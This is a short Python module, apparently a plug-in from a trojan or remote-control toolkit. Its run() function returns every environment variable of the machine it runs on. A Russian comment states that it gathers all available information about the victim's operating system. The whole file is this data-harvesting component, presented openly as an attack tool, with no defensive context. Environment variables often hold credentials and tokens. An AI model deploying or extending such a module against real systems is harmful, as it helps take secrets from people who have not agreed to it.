import os

def run(**args):
    print("[*] In environment module")
    return os.environ # тут мы собираем всю доступную информацию о операционной системе жертвы
    